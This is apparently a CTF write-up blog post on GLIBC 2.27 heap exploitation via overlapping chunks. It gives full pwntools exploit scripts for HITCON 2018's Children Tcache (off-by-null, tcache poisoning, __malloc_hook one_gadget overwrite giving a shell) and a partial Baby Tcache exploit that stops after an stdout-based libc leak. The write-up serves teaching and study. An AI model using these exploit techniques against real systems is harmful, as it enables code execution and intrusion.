---
layout:     post
title:      "Overlapping Chunks: GLIBC 2.27 Heap Exploitation"
date:       2021-01-21
author:    "D4mianWayne"
tag:      libc-2.27, heap, pwn, ctf, hitcon, tcache, roppy
category:  Pwning
---

This is going to be an in-depth explaination of the overlapping chunks techniques on GLIBC 2.27, this technique can also be produced on the GLIBC 2.23 but for this blog, I did a challenge from HITCON CTF 2018 which seemed very interesting in itself. I loved this challenges as I learned a lot about heap internals and how the heap really recycles the chunk and how `prev_size` plays a big role here.

# Foreword

This technique of overlapping refers to the scenario when a `free`'d chunk actually overlaps into an already allocated chunk resulting in overwriting the heap pointer of the other chunks. This is usally chained with the Off By Null overflow resulting in the `PREV_INUSE` bit of the next chunk being overwritten.

The best way to understand this technique is to make use of the challenge(s) since that way we will analyse the heap as we step in. Now, to start off, there are two binaries taken from the HITCON 2018 CTF, following are the link to the binary, Libc, exploits and IDA database for the corresponding binary.

***
##### Attachment

* **Children Tcache** : <https://github.com/D4mianWayne/PwnLand/tree/master/Heap/GLIBC%202.27/Overlapping%20Chunks>
* **Baby Tcache** : 
***

Now, let's continue on the challenges.

# Children Tcache

This challenge was remarkably easier than the Baby Tcache from the same CTF, that being said, let's start with checking the binary's security:-

```r
vagrant@ubuntu-bionic:~/sharedFolder/training/hitcon$ checksec baby_tcache
[*] '/home/vagrant/sharedFolder/training/hitcon/baby_tcache'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

As expected from the good CTF, all the security mechanisms are enabled but little do we know, it doesn't even matter, let's work on. Now, for this part, explaining the whole binary functionalities would be tiresome and won't be needed at all, all we need to is to find the overall workflow of the binary and where exactly the vulnerability reside. The vulnerabilty as mentioned before the technique we are going to discuss here usually chained with the Off by Null vulnerability.

```C
unsigned __int64 add()
{
  int i; // [rsp+Ch] [rbp-2034h]
  char *dest; // [rsp+10h] [rbp-2030h]
  unsigned __int64 size; // [rsp+18h] [rbp-2028h]
  char s; // [rsp+20h] [rbp-2020h]
  unsigned __int64 v5; // [rsp+2038h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  memset(&s, 0, 0x2010uLL);
  for ( i = 0; ; ++i )
  {
    if ( i > 9 )
    {
      puts(":(");
      return __readfsqword(0x28u) ^ v5;
    }
    if ( !heap_list[i] )
      break;
  }
  printf("Size:");
  size = read_int();
  if ( size > 0x2000 )
    exit(-2);
  dest = (char *)malloc(size);
  if ( !dest )
    exit(-1);
  printf("Data:");
  read_string((__int64)&s, size);
  strcpy(dest, &s);
  heap_list[i] = dest;
  size_list[i] = size;
  return __readfsqword(0x28u) ^ v5;
}
```
The `read_string` is not vulnerable here, actually the issue here is the `strcpy(dest, &s)`, since `strcpy` copies the data from the `&s` to the `dest` including the terminator `\0` null byte, this leads to Off by Null overflow, as the technqiue implies, the `man strcpy` says:-

> The `strcpy()` function copies the string pointed to by `src`, including the terminating null byte (`'\0`'), to the buffer pointed to by `dest`. The strings may not overlap, and the destination string dest
>      must be large enough to receive the copy.

 Now, since we know that there is a vulnerability, we need to know the overall workflow of this binary, the workflow is as following:-

 * It implements 3 basic functions, `add`, `delete` and `view`.
 * It used a global pointer to store information about chunks and the size allocated.
 * The `add` function is vulnerable to the Off by Null vulnerability.
 * It allows the allocation size upto `0x2000`.
 * There's no Use After Free vulnerability.
 * It allows the active number of allocations upto 10(inclusice) times.

 ### Exploitation 

 First and foremost, I created the wrapper functions such that we interact with binary more freely:-

```py
from pwn import *

def new_heap(size, data, attack=False):
    p.sendlineafter('Your choice: ', '1')
    p.sendlineafter('Size:', str(size))
    if attack:
        return
    p.sendafter('Data:', data)
    if len(data) < size:
        p.sendline()

def show_heap(index):
    p.sendlineafter('Your choice: ', '2')
    p.sendlineafter('Index:', str(index))

def delete_heap(index):
    p.sendlineafter('Your choice: ', '3')
    p.sendlineafter('Index:', str(index))
```

This being aide, now let's jump into the heap exploitation part, to start off, we will create following number of chunks:-

* `0x500` size chunk.
* `0x68` size chunk.
* `0x5f0` size chunk.
* `0x18` size chunk.

This is because, we will need the 2 chunk of size such that when `tcache` bins would be full they'll land into the `unsorted` bin. Moving on, we will fill the `tcache` bins for the `size` of the chunks we allocated:-

```py
p = process("./children_tcache")

# heap_list[0] => chunk_0 (0x511)
new_heap(0x500, 'a' * 0x4ff)

# heap_list[1] => chunk_1 (0x71)
new_heap(0x68, 'b' * 0x67)

# heap_list[2] => chunk_2 (0x601)

new_heap(0x5f0, 'c' * 0x5ef)

# heap_list[3] => chunk_3 (0x31)
# This chunk is for preventing consolidation of previous chunk with the top chunk

new_heap(0x20, 'd' * 0x20)
```
Now, this will do the allocation, as nothing important to see as much, to explain the size allocation here, we will be `unsorted` bin size for doing the overlapping chunk here, to move on, we will delete the `chunk_1` and `chunk_0`, the `chunk_1` belongs to the `unsorted` bin since it's size is morte than the `tcache` can hold and the `chunk_0` will go in the `tcache`.
```py
# we need to delete chunk_1, this is because we will be using this chunk to
#  to trigger the off-by-null (poison-null-byte) attack

delete_heap(1)

# chunk_0 should be freed so it can be consolidated with chunk_2 later
delete_heap(0)
```

Running the exploit:-

```r
ef➤  heap bins
──────────────────────────────────────────────────── Tcachebins for arena 0x7ffff7dcdc40 ────────────────────────────────────────────────────
Tcachebins[idx=5, size=0x70] count=1  ←  Chunk(addr=0x555555757770, size=0x70, flags=) 
───────────────────────────────────────────────────── Fastbins for arena 0x7ffff7dcdc40 ─────────────────────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
──────────────────────────────────────────────────── Unsorted Bin for arena 'main_arena' ────────────────────────────────────────────────────
[+] unsorted_bins[0]: fw=0x555555757250, bk=0x555555757250
 →   Chunk(addr=0x555555757260, size=0x510, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
───────────────────────────────────────────────────── Small Bins for arena 'main_arena' ─────────────────────────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
───────────────────────────────────────────────────── Large Bins for arena 'main_arena' ─────────────────────────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  
```

Now, as you can see the chunk `0x555555757260` belongs to the `unsorted` bin and the chunk `0x555555757770` belongs to the `tcache`'s `bin[5]` being the size `0x70`. Now, the tricky part is that, whenever the chunk is `free`'d, the program `memsets` the `free`'d chunk with the `0xda` byte by byte, overwriting whatever was written in the chunk so far.

```py
# when we free a chunk, programs writes 0xDA to the whole chunk
# so, we need to zero out some parts of the chunk_1. Therefore,
# we are allocating/freeing the chunk_1 multiple times with different sizes
# interestingly, it always have chunk size of 0x71, but the program only cares
# about the input size
for i in range(9):
    # heap_list[0] => chunk_1 (0x71)
    # this causes strcpy writes null byte at the end of buffer.
    # when i == 0, off-by-one happens and turn size of chunk_2 from
    # 0x601 t0 0x600. Therefore, we clear PREV_IN_USE bit.
    new_heap(0x68 - i, 'b' * (0x68 - i))
    # we need to free the chunk, so malloc returns it on the next new_heap call
    delete_heap(0)
```
So, what we do here is, since the `free`'d chunk's contents is being overwritten by the `0xda` byte by byte, to mitigate this in such a way that the `chunk_1`, the chunk which went into the `tcache`, so here doing constant allocation of the size ranging from the `0x5f` to `0x68`, all of them will land into the `tcache` bin[5] since the rounding size for the chunks allocated in that range will have the `0x70` size and will be in the `bin[5]`.

Now, doing allocation and the deletion of the chunks accordingly, since the `strcpy` will append the `\0` to the adjancent chunk and the continual deletion and the allocation of the chunks as the size is same as of `0x70`, for every allocation it'll just return the chunk from the `bin[5]`, this will result in the `PREV_INUSE` flag of the adjacent chunk being overwritten.

```r
gef➤  heap bins
──────────────────────────────────────────────────── Tcachebins for arena 0x7ffff7dcdc40 ────────────────────────────────────────────────────
Tcachebins[idx=5, size=0x70] count=1  ←  Chunk(addr=0x555555757770, size=0x70, flags=) 
───────────────────────────────────────────────────── Fastbins for arena 0x7ffff7dcdc40 ─────────────────────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
──────────────────────────────────────────────────── Unsorted Bin for arena 'main_arena' ────────────────────────────────────────────────────
[+] unsorted_bins[0]: fw=0x555555757250, bk=0x555555757250
 →   Chunk(addr=0x555555757260, size=0x510, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
───────────────────────────────────────────────────── Small Bins for arena 'main_arena' ─────────────────────────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
───────────────────────────────────────────────────── Large Bins for arena 'main_arena' ─────────────────────────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/10xg  0x0000555555554000 + 0x202060
0x555555756060:	0x0000000000000000	0x0000000000000000
0x555555756070:	0x00005555557577e0	0x0000555555757de0
gef➤  x/2xg 0x00005555557577e0 - 0x10
0x5555557577d0:	0x0000000000000000	0x0000000000000600
gef➤  heap chunk 0x00005555557577e0
Chunk(addr=0x5555557577e0, size=0x600, flags=)
Chunk size: 1536 (0x600)
Usable size: 1528 (0x5f8)
Previous chunk size: 0 (0x0)
PREV_INUSE flag: Off
IS_MMAPPED flag: Off
NON_MAIN_ARENA flag: Off

gef➤  
```

Now, as you can see the `heap_list` is at the address `0x555555756060` which have the chunk `0x00005555557577e0` at the index 2, seeing the `PREV_INUSE` flag for that chunk we see that it is cleared. Now, to work on with this, we will overwrite the `prev_size` for the `chunk_2`, what we will do is allocate a chunk of size `0x68` such that it'll be returned by the `tcache` and we will overwrite the adjacent chunk's i.e. `chunk_2`'s `prev_size`.

```py
# heap_list[0] => chunk_1 (0x71)
# this set the prev_size field of chunk_2
new_heap(0x68, b'b' * 0x60 + p64(0x580))

# when we free chunk_2, it consolidates with chunk_0
# therefore, we have a overlapping free chunk with chunk_1
# the resulting big chunk will be put in the unsorted bin
delete_heap(2)
```

Doing so,

```r
gef➤  heap bins
──────────────────────────────────────────────────── Tcachebins for arena 0x7ffff7dcdc40 ────────────────────────────────────────────────────
───────────────────────────────────────────────────── Fastbins for arena 0x7ffff7dcdc40 ─────────────────────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
──────────────────────────────────────────────────── Unsorted Bin for arena 'main_arena' ────────────────────────────────────────────────────
[+] unsorted_bins[0]: fw=0x555555757250, bk=0x555555757250
 →   Chunk(addr=0x555555757260, size=0xb80, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
───────────────────────────────────────────────────── Small Bins for arena 'main_arena' ─────────────────────────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
───────────────────────────────────────────────────── Large Bins for arena 'main_arena' ─────────────────────────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/10xg  0x0000555555554000 + 0x202060
0x555555756060:	0x0000555555757770	0x0000000000000000
0x555555756070:	0x0000000000000000	0x0000555555757de0
0x555555756080:	0x0000000000000000	0x0000000000000000
0x555555756090:	0x0000000000000000	0x0000000000000000
0x5555557560a0:	0x0000000000000000	0x0000000000000000
gef➤  x/30xg 0x0000555555757770
0x555555757770:	0x6262626262626262	0x6262626262626262
0x555555757780:	0x6262626262626262	0x6262626262626262
0x555555757790:	0x6262626262626262	0x6262626262626262
0x5555557577a0:	0x6262626262626262	0x6262626262626262
0x5555557577b0:	0x6262626262626262	0x6262626262626262
0x5555557577c0:	0x6262626262626262	0x6262626262626262
0x5555557577d0:	0x0000000000000580	0x0000000000000600 <-------------- The prev_size has been overwritten
```

Now, we will have to `free(2)` such that the `chunk_3` the target chunk having the `prev_size` value `0x580` will consolidate with the chunk `0x0000555555757770`, so when we allocate a chunk of the size being the `0x508` this will result in the `fd` and the `bk` being populated with the `main_arena`'s address for the chunk `0x0000555555757770`, so initially the `chunk_0` i.e. `0x0000555555757770`  was not cleared but consolidated but since the global pointer contains this chunk's pointer on the index `0`, doing `show(0)`, we will have the LIBC leak, with the help of it we can defeat the ASLR.

```py
# heap_list[1] => chunk_4 (0x511)
# this will use the unsorted bin for allocation, and writes
# a libc address into chunk_1 fd/bk fi
new_heap(0x508, 'e' * 0x507)

# viwing chunk_1 will leak libc address
show_heap(0)

libc_addr = p.recvuntil('\n$$')[:-3]
libc_base = u64(libc_addr + b'\x00' * (8 - len(libc_addr))) - 0x3ebca0
log.info('LIBC Base: {}'.format(hex(libc_base)))
```

Now, doing so:-

```r
gef➤  x/10xg  0x0000555555554000 + 0x202060
0x555555756060:	0x0000555555757770	0x0000555555757260
0x555555756070:	0x0000000000000000	0x0000555555757de0
0x555555756080:	0x0000000000000000	0x0000000000000000
0x555555756090:	0x0000000000000000	0x0000000000000000
0x5555557560a0:	0x0000000000000000	0x0000000000000000
gef➤  x/8xg 0x0000555555757770 - 0x10
0x555555757760:	0x0065656565656565	0x0000000000000671  <--- the 0x671 = (0x600 + 0x71) is consolidated and for which after the allocation the fd & bk is populated
0x555555757770:	0x00007ffff7dcdca0	0x00007ffff7dcdca0
```

Having the leak:-

```r
vagrant@ubuntu-bionic:~/sharedFolder/training/hitcon$ python3 children_tcache.py
[+] Starting local process './children_tcache': pid 2842
[*] LIBC Base: 0x7ffff79e2000
[*] Switching to interactive mode
$$$$$$$$$$$$$$$$$$$$$$$$$
🍊    Children Tcache    🍊
$$$$$$$$$$$$$$$$$$$$$$$$$$$
$   1. New heap           $
$   2. Show heap          $
$   3. Delete heap        $ 
$   4. Exit               $ 
$$$$$$$$$$$$$$$$$$$$$$$$$$$
Your choice: $ 
```

Now, we have the LIBC leak, defeating the ASLR, we have to now force the `malloc` to return a pointer which we can overwrite like `__malloc_hook` or `__free_hook` by taking advantage of the heap layout. To do so, initally we will take the overlapping of these chunks to get the duplicate entry, to replicate it, we will allocate a chunk of size `0x68` this will return the chunk as same as of the `chunk_1`. So, when we do the `free(1)` and `free(5)`, it'll result in the same chunk being deleted, since two chunks are `free`'d the `tcache` will have the duplicate entry for the chunks, making a loop, due to which we will be able to overwrite the `fd` & `bk` of the `free`'d chunk and let it return the chunk.

```py
# heap_list[2] => chunk_5 (0x71)
# this will allocate chunk_5 exactly in the same place as chunk_1
new_heap(0x68, 'f' * 0x67)

# we used tcache_dup attack here which is due to double free
# freeing chunk_1 and chunk_5 put them in the same bin in tcache
# even though they are pointing to the same address
# This will create a loop within the tcache bin
delete_heap(0)
delete_heap(2)
```

Now, doing so, when we see the heap layout:-

```r
gef➤  heap bins
──────────────────────────────────────────────────── Tcachebins for arena 0x7ffff7dcdc40 ────────────────────────────────────────────────────
Tcachebins[idx=5, size=0x70] count=2  ←  Chunk(addr=0x555555757770, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x555555757770, size=0x70, flags=PREV_INUSE)  →  [loop detected]
───────────────────────────────────────────────────── Fastbins for arena 0x7ffff7dcdc40 ─────────────────────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
──────────────────────────────────────────────────── Unsorted Bin for arena 'main_arena' ────────────────────────────────────────────────────
[+] unsorted_bins[0]: fw=0x5555557577d0, bk=0x5555557577d0
 →   Chunk(addr=0x5555557577e0, size=0x600, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
───────────────────────────────────────────────────── Small Bins for arena 'main_arena' ─────────────────────────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
───────────────────────────────────────────────────── Large Bins for arena 'main_arena' ─────────────────────────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/10xg 0x555555757770
0x555555757770:	0x0000555555757770	0x0000555555757010  The fd of this chunk is overwritten with its own address
0x555555757780:	0xdadadadadadadada	0xdadadadadadadada
0x555555757790:	0xdadadadadadadada	0xdadadadadadadada
0x5555557577a0:	0xdadadadadadadada	0xdadadadadadadada
```

As shown from the `tcache` bins, we have a `free`'d chunk's `fd` is pointing to it's own address, which commonly refer as `tcache` dup entry. Now, we will overwrite the `fd` of the same chunk with the target chunk, for the target chunk I used the `__malloc_hook` but you can also go with the `__free_hook` way:-


Now, to do so, we will allocate a chunk, which will return the chunk `0x0000555555757770`, then we will overwrite the `fd` pointer with the target chunk `__malloc_hook`, then we will do one more allocation such that it'll have the `tcache` head pointing to the target chunk adress:-

```py
# we can create a fake chunk i.e. target pointing to the __malloc_hook
malloc_hook = libc_base + 0x3ebc30
fake_chunk = malloc_hook
log.info('fake chunk: {}'.format(hex(fake_chunk)))

# heap_list[4] => chunk_5 (0x71)
# we used tcache_poisoning here
# chunk_5 will be served from tcache and we will put the address of
# our fake chunk in the chunk_1's fd.
new_heap(0x68, p64(fake_chunk))

# heap_list[5] => chunk_1 (0x71)
# this allocation serves chunk_1 and put fake chunk address in the tcache
new_heap(0x68, 'h' * 0x67)
```

Doing so:-

```r
gef➤  heap bins tcache
──────────────────────────────────────────────────── Tcachebins for arena 0x7ffff7dcdc40 ────────────────────────────────────────────────────
Tcachebins[idx=5, size=0x70] count=0  ←  Chunk(addr=0x7ffff7dcdc0d, size=0x0, flags=)  ←  [Corrupted chunk at 0xfff7dc9d60000000]
```

Now, the next allocation will return the address `0x7ffff7dcdc0d`, which we can overwrite with the `one_gadget`, resulting in the `__malloc_hook` being overwritten with the `one_gadget`'s address and trigger the `__malloc_hook` by allocating a chunk, hence getting a shell:-

```py
# heap_list[6] => fake_chunk (0x7f)
# since fake_chunk is at the head of the list, this allocation returns it
# then, we overwrite __malloc_hook with one gadget
new_heap(0x68, p64(libc_base + 0x4f432))

# this allocation triggers __malloc_hook and we have shell
new_heap(1, '', True)
p.interactive()
```

Doing so:-

```r
vagrant@ubuntu-bionic:~/sharedFolder/training/hitcon$ python3 children_tcache.py
[+] Starting local process './children_tcache': pid 3225
[*] LIBC Base: 0x7ffff79e2000
[*] fake chunk: 0x7ffff7dcdc30
[*] Switching to interactive mode
$ whoami
vagrant
$ echo "Pwned"
Pwned
$ 
[*] Interrupted
```

This was an interesting challenge.

# Baby Tcache

This was another challenge proposed in the HITCON 2018 as a part of the pwn category, although the general idea for the exploit was same but the catch here was the `show` function was not there anymore, this made the approach to this challenge significantly harder than the Children Tcache. In order to pwn the binary, we have to get the LIBC address but since there is no `show`, we will take the advantage of the `stodut` structure, in order to get leak of the LIBC address, we will first understand the `_IO_2_1_stdout_`, so let's delve into it without wasting any time.

To save the time, we are not going to reverse engineering the binary since it is same as of the `children tcache`, the only difference is that this binary doesn't have `show` function making considerably harder for the LIBC leak **but not impossible**.

> The address might be different in the snippets but the core principle is same, ASLR was on during the test as well, so the address randomization could be seen.

Using the same wrapper function from the previous challenge:-

```py
from pwn import *

p = process("./baby_tcache")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def add(size,data,val=1):
        s.recvuntil("Your choice: ")
        s.sendline(str(1))
        s.recvuntil("Size:")
        s.sendline(str(size))
        ret = s.recvuntil("Data:",timeout=5)
        if ret == "":
            exit()
        if(val):
            s.sendline((data))
        else:
            s.send((data))

def free(idx):
        s.recvuntil("Your choice: ")
        s.sendline(str(2))
        s.recvuntil("Index:")
        s.sendline(str(idx))
```

We will follow the same approach, this being said, as we did in the above challenge, we overlapped two chunks such that the `main_arena` address was populated to the allocated chuk as from the `heap_list` making us to leak the addresses, this time since we don't have a `show` function, we will overwrite the last few bits of the populated address such that it points to the `_IO_2_1_stdout_` so that the `fd` of the `free`'d chunk from the `unsorted` bin would point to the `_IO_2_1_stdout_` such that it'd be return to us upon next allocation.

Now, we will alllocate the chunk of following size, usually the ones which will go to either the `tcache` bin or the `unsorted` bin:-

```py

 # heap_chunks[0] ==> size 0x500
add(0x4f0,"a"*0x8,1)
# heap_chunks[1] ==> size 0x070
add(0x60,"b"*8)
# heap_chunks[2] ==> size 0x40
add(0x30,"a"*8)
# heap_chunks[3] ==> size 0x20
add(0x10,"a"*8)
# heap_chunks[4] ==> size 0x500
add(0x4f0,"b"*8,0)
# heap_chunks[5] ==> size 0x20
add(0x10,"a"*8)
```

Now, here we allocated the `chunk[0]` and `chunk[4]` in an unsorted bin range and the rest of them usually belongs to the `tcache` bin range. Now, what we will do here is, free the `chunk[3]` of size `0x10` and then allocate a chunk of size `0x18` but at the same it'll belong to the bin of the `0x20`, the same chunk will be returned. When that will happen, since the actual size we allocated and we are allowed to write to will be of size `0x18` allowing us to write into the metadata and if we will look at the layout of the chunk:-

```r
The 0x20 chunk

+++++++++++++++++++++++++++
|   0x00      |  0x00     | --> 0x10
+++++++++++++++++++++++++++
|  prev_size  |   size    | --> 0x10 
---------------------------

After we edit the metadata of the chunk

++++++++++++++++++++++++++
|  0x00       | 0x00     |
++++++++++++++++++++++++++
| 0x5d0       | 0x501    | --> heap_chunks[4] size
--------------------------
```
Now, what will happen here is we will trigger the off by one vulnerability and as well as the `prev_size` this will result in the chunk layout being:-

```r
++++++++++++++++++++++++++
|  0x00       | 0x00     |
++++++++++++++++++++++++++
| 0x5d0       | 0x500    | 
--------------------------
```

So, when we look at it ourselves in the gdb:-

```py
free(3)
add(0x18,p64(0x00) *2 + p64(0x5d0),0)
```

The chunk layout in the memory will be:-

```r
gef➤  x/40xg 0x0000555df391c810
0x555df391c810:	0x0000000000000000	0x0000000000000000
0x555df391c820:	0x00000000000005d0	0x0000000000000500
```

So, now when we will free the `chunk[0]` and `chunk[4]`:-

```py
free(0)
free(4)
```

Running so:-

```r
gef➤  heap bins unsorted
────────────────────────────────── Unsorted Bin for arena 'main_arena' ──────────────────────────────────
[+] unsorted_bins[0]: fw=0x55dd71e62250, bk=0x55dd71e62250
 →   Chunk(addr=0x55dd71e62260, size=0xad0, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
gef➤  p/x 0x500 + 0x5d0
$4 = 0xad0
gef➤  
```

Now, the total size of the chunk belongs to the `unsorted` bin is `0xad0` is the summation of the `0x500` and the size we gave it as the `0x5d0`, hence `0xad0`. But at the same time when we see the whole heap layout, it turns out to be like this:-

```r
gef➤  heap chunks
Chunk(addr=0x55dd71e62010, size=0x250, flags=PREV_INUSE)
    [0x000055dd71e62010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x55dd71e62260, size=0xad0, flags=PREV_INUSE)
    [0x000055dd71e62260     a0 6c 50 9e d4 7f 00 00 a0 6c 50 9e d4 7f 00 00    .lP......lP.....]
Chunk(addr=0x55dd71e62d30, size=0x20, flags=)
    [0x000055dd71e62d30     61 61 61 61 61 61 61 61 00 00 00 00 00 00 00 00    aaaaaaaa........]
Chunk(addr=0x55dd71e62d50, size=0x202c0, flags=PREV_INUSE)  ←  top chunk
gef➤  

```

If you pay attention, we had almost 6 chunks allocated in which we `free`'d 2 of them, that leaves the 4 of them allocated, but as the `gef` output we can definitely see only two chunks here referenced, first is the one we `free`'d and went into the unsorted bin and other one is the last chunk we allocated to prevent the `top_chunk` consolidation. But when we look at the gloabal array which keeps the track of the allocated chunks,

```r
gef➤  x/30xg 0x55dd713f3050
0x55dd713f3050:	0x0000000000000000	0x0000000000000000
0x55dd713f3060:	0x0000000000000000	0x000055dd71e62760
0x55dd713f3070:	0x000055dd71e627d0	0x000055dd71e62810
0x55dd713f3080:	0x0000000000000000	0x000055dd71e62d30
```

It shows we have 4 allocated chunks, this shows that the `chunk[1]` and the `chunk[2]` and the `chunk[3]` now is within the `unsorted` bin chunk. It overlaps the chunks contigously laid out. So, now we will `free` the `chunk[1]` and the `chunk[3]`:-

```py
free(1)
free(3)
```

Checking the bins and the heap chunks layout:-


```r
gef➤  x/400xg 0x5623a643c250
0x5623a643c250:	0x0000000000000000	0x0000000000000ad1
0x5623a643c260:	0x00007fda26360ca0	0x00007fda26360ca0
0x5623a643c270:	0x0000000000000000	0x0000000000000000

             [..snip..]

0x5623a643c750:	0x0000000000000500	0x0000000000000070
0x5623a643c760:	0x0000000000000000	0x00005623a643c010
0x5623a643c770:	0xdadadadadadadada	0xdadadadadadadada
0x5623a643c780:	0xdadadadadadadada	0xdadadadadadadada
0x5623a643c790:	0xdadadadadadadada	0xdadadadadadadada
0x5623a643c7a0:	0xdadadadadadadada	0xdadadadadadadada
0x5623a643c7b0:	0xdadadadadadadada	0xdadadadadadadada
0x5623a643c7c0:	0x0000000000000000	0x0000000000000041
0x5623a643c7d0:	0x6161616161616161	0x0000000000000000
0x5623a643c7e0:	0x0000000000000000	0x0000000000000000
0x5623a643c7f0:	0x0000000000000000	0x0000000000000000
0x5623a643c800:	0x0000000000000000	0x0000000000000021
0x5623a643c810:	0x0000000000000000	0x00005623a643c010
0x5623a643c820:	0xdadadadadadadada	0x0000000000000500
0x5623a643c830:	0xdadadadadadadada	0xdadadadadadadada

             [..snip..]

0x5623a643cd20:	0x0000000000000ad0	0x0000000000000020
0x5623a643cd30:	0x6161616161616161	0x0000000000000000
0x5623a643cd40:	0x0000000000000000	0x00000000000202c1
```

Now, if we do pay attention the `chunk[1]` and the `chunk[3]` which we `free`'d a moment ago is within the chunk we `free`'d with the extended size, resulting in the overlap. Now, we will just allocate a chunk of size `0x4f0` giving the chunk `0x500` from the `unsorted` bin and then again allocating a chunk of size `0x90` and this time, we will get a chunk from the `unsorted` bin, since the given chunk will have it's `fd` and `bk` populated with the `main_arena`, we will attempt to write the last 4 bits of the `fd` address such that it would point to the `_IO_2_1_stdout->flags`:-


```py
add(0x4f0,"a")

# partial overwrite to stdout->_flags

add(0x90,b"\x60\x07",0)
```

Doing that so, we get the `_IO_2_1_stdout_` address populated to the `heap_chunks` global array at the index `3`, this happened because when we allocated the chunk of size `0x4f0` that made the all the chunks which we `free`'d belonging to the `tcache` bin as they overlapped into the `unsorted` bin result in the `free`'d chunks also being populated with the `main_arena` address. So, when we allocate a chunk of size `0x90` will be given from the `unsorted` bin, from the overlapped region, hence we could overwrite the last 4 bits of the address and made it point to the `_IO_2_1_stdout_`:-

```r
gef➤  x/10xg 0x56431531d050
0x56431531d050:	0x0000000000000000	0x0000000000000000
0x56431531d060:	0x0000564316c8f260	0x0000564316c8f760
0x56431531d070:	0x0000564316c8f7d0	0x0000564316c8f760
0x56431531d080:	0x00007fa0293a0760	0x0000564316c8fd30
0x56431531d090:	0x0000000000000000	0x0000000000000000
gef➤  p &_IO_2_1_stdout_ 
$51 = (struct _IO_FILE_plus *) 0x7fa0293a0760 <_IO_2_1_stdout_>
```

Now, what we will do here is make the `flag` to be `0xfbad1800` and the associating member of the `struct` to be of the NULL, hence resulting in the next `puts` call, which will call the `_IO_new_file_xsputn` hence, giving a huge buffer dump:-

```r
gef➤  p _IO_2_1_stdout_ 
$52 = {
  file = {
    _flags = 0xfbad1800, 
    _IO_read_ptr = 0x7fa0293a07e3 <_IO_2_1_stdout_+131> "\n", 
    _IO_read_end = 0x7fa0293a07e3 <_IO_2_1_stdout_+131> "\n", 
    _IO_read_base = 0x7fa0293a07e3 <_IO_2_1_stdout_+131> "\n", 
    _IO_write_base = 0x7fa0293a07e3 <_IO_2_1_stdout_+131> "\n", 
    _IO_write_ptr = 0x7fa0293a07e3 <_IO_2_1_stdout_+131> "\n", 
    _IO_write_end = 0x7fa0293a07e4 <_IO_2_1_stdout_+132> "", 
    _IO_buf_base = 0x7fa0293a07e3 <_IO_2_1_stdout_+131> "\n", 
    _IO_buf_end = 0x7fa0293a07e4 <_IO_2_1_stdout_+132> "", 
    _IO_save_base = 0x0, 
    _IO_backup_base = 0x0, 
    _IO_save_end = 0x0, 
    _markers = 0x0, 
    _chain = 0x7fa02939fa00 <_IO_2_1_stdin_>, 
    _fileno = 0x1, 
    _flags2 = 0x0, 
    _old_offset = 0xffffffffffffffff, 
    _cur_column = 0x0, 
    _vtable_offset = 0x0, 
    _shortbuf = "\n", 
    _lock = 0x7fa0293a18c0 <_IO_stdfile_1_lock>, 
    _offset = 0xffffffffffffffff, 
    _codecvt = 0x0, 
    _wide_data = 0x7fa02939f8c0 <_IO_wide_data_1>, 
    _freeres_list = 0x0, 
    _freeres_buf = 0x0, 
    __pad5 = 0x0, 
    _mode = 0xffffffff, 
    _unused2 = '\000' <repeats 19 times>
  }, 
  vtable = 0x7fa02939c2a0 <_IO_file_jumps>
}
```

```py
add(0x60,"w")
add(0x60,p64(0xfbad1800) + p64(0x00)*3 + b"\x00",1)
```

This resulted in:-

![](/img/pwning/dump.png)

Now, such that this has happened, we carefully parse the leak which resulted in a success LIBC leak:-


```py
libc_leak=u64(p.recv(6)+b"\x00\x00")-0x3ebff0

log.info("LIBC:  "+hex(libc_leak))
free_hook=libc_leak + libc.symbols['__free_hook']
system=libc_leak + libc.symbols['system']
one_gadget = libc_leak+0x4f432
```

And we get a success LIBC leak, thus defeating the ASLR:-

```r
[+] Starting local process './baby_tcache': pid 4839
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] 0x7ff4d3954000
[*] Switching to interactive mode

[..snip..]

🍊      Baby Tcache      🍊
